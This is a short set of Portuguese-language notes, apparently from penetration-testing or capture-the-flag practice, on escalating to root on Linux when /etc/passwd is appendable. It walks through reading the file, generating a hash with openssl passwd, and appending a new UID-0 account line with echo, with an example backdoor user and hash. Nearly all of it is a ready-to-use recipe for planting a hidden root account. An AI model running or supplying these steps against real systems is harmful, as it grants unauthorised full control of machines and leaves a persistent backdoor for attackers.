 ARQUIVO PASSWD:  

	OUTRA FORMA TAMBÉM DE FAZER ISSO, SERIA QUANDO OCORRE DE NÃO PODER EDITAR O ARQUIVO, MAS
	PODE SE ADICIONAR LINHAS NO ARQUIVO.
	
	1.PEGAR AS INFORMAÇÕES DO ARQUIVO.
		
		COMANDO: cat /etc/passwd
		
	2.COPIAR A LINHA DO ROOT.
		
		EX: root:x:0:0:root:/root:/bin/bash
		
	3.CRIAR UMA HASHING
		
		COMANDO: openssl passwd <senha>
		
	4.COLOCAR O COMANDO DE ECHO COM A LINHA COPIADA.
		
		COMANDO: echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd
		
	5.EDITAR O NOME DE USUÁRIO E ALTERAR O X PELA SENHA ANTES DE ECOAR.
		
		EX: echo "thxny:$1$kskamdnsLSk23:0:0:root:/root:/bin/bash" >> /etc/passwd
		
	6.ENVIAR O ECHO.
	
	7.ASSIM QUANDO QUISER ACESSO ROOT, USE O USUÁRIO QUE VOCÊ ADICIONOU E A SENHA QUE VOCÊ 
	CRIPTOGRAFOU E ADICIONOU.
	
	EXTRA: OS '>>' SIGNIFICA PARA O ECHO APENAS ADICIONAR NO FINAL DO ARQUIVO A LINHA QUE VOCÊ
	CRIOU.
